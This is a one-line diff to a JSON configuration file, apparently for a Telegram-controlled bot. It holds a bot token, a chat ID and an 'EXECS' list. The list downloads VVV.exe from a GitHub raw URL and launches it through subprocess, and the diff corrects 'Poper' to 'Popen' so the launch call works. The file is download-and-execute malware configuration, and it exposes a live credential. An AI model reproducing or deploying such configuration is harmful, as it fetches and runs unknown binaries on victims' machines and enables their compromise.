@@ -1,1 +1,1 @@
-{"TOKEN": "7626334153:AAFnLe5VnX2tcL5hq2XhekD95oxrjRxbnWE", "CHAT_ID": "6036761167", "COMMANDS": [], "EXECS": ["requests.get('https://github.com/Tigrik121123/GetInfo/raw/refs/heads/main/VVV.exe')", "import subprocess", "subprocess.Poper(['start', '', VVV.exe], shell=True)"]}
+{"TOKEN": "7626334153:AAFnLe5VnX2tcL5hq2XhekD95oxrjRxbnWE", "CHAT_ID": "6036761167", "COMMANDS": [], "EXECS": ["requests.get('https://github.com/Tigrik121123/GetInfo/raw/refs/heads/main/VVV.exe')", "import subprocess", "subprocess.Popen(['start', '', VVV.exe], shell=True)"]}
